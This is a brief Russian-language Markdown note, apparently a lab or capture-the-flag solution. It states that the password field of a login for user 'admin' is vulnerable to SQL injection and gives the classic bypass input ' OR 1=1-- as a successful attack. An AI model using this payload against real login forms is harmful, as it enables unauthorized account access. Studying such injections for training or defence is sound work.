# SQL Injection

* Атака проводится на пользователя `admin`.
* Поле `password` уязвимо к SQL-инъкции. 

### Пример успешного проведения атаки:
```
username: admin
password: ' OR 1=1--
```
